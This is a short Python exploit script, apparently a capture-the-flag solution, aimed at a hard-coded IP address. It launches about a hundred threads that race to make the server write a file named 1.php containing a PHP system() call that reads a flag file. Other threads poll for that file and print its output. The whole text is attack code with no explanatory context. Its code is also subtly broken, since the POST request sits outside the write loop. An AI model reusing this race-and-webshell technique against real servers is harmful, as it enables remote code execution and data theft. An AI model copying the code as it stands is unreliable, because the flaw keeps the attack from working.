# -*- coding: utf-8 -*-
# @Time : 20.12.5 11:41
# @author:lonmar
import io
import requests
import threading

url = 'http://8.134.167.231:55664/'


def write():
    while event.isSet():
        data = {
            'tan91': '<?php system("cat /ctfer_fl0g_here.txt");?>'
        }
    requests.post(url=url+'?ctf=1.php', data=data)


def read():
    while event.isSet():
        response = requests.get(url + '1.php')
        if response.status_code != 404:
            print(response.text)
            event.clear()


if __name__ == "__main__":
    event = threading.Event()
    event.set()
    for i in range(1, 100):
        threading.Thread(target=write).start()

    for i in range(1, 100):
        threading.Thread(target=read).start()
